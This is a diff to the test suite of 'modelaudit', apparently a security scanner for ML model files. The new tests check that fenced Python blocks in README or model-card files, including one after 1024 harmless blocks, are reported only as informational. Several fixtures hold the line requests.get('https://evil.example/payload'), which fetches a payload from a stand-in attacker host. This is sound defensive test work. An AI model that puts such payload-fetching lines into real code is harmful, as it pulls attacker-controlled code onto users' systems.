@@ -7,7 +7,7 @@ from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.core import determine_exit_code, scan_file, scan_model_directory_or_file
 from modelaudit.scanner_results import SCAN_OUTCOME_MESSAGE_METADATA_KEY
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
-from modelaudit.scanners.text_scanner import MAX_DOCUMENTATION_FENCED_CODE_RANGES, TextScanner
+from modelaudit.scanners.text_scanner import TextScanner
 from modelaudit.utils.helpers import cache_decorator
 
 
@@ -151,6 +151,48 @@ def test_text_scanner_model_card_aliases_preserve_executable_network_findings(
         for check in result.checks
     )
     assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize("filename", ["README", "model_card"])
+def test_text_scanner_extensionless_fenced_documentation_is_informational(tmp_path: Path, filename: str) -> None:
+    text_path = tmp_path / filename
+    text_path.write_text(
+        """```python
+requests.get("https://evil.example/payload")
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_crlf_fenced_documentation_is_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_bytes(b'```python\r\nrequests.get("https://evil.example/payload")\r\n```\r\n')
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_late_fenced_documentation_stays_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        ("```python\npass\n```\n" * 1024) + '```python\nrequests.get("https://evil.example/payload")\n```\n'
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
 
 
 @pytest.mark.parametrize("filename", ["model_card.txt", "modelcard.md"])
@@ -781,12 +823,6 @@ download("https://evil.example/payload")
         for check in result.checks
     )
     assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_range_collection_is_bounded() -> None:
-    payload = b"```python\npass\n```\n" * (MAX_DOCUMENTATION_FENCED_CODE_RANGES + 1)
-
-    assert len(TextScanner._documentation_fenced_code_ranges(payload)) == MAX_DOCUMENTATION_FENCED_CODE_RANGES
 
 
 @pytest.mark.parametrize(
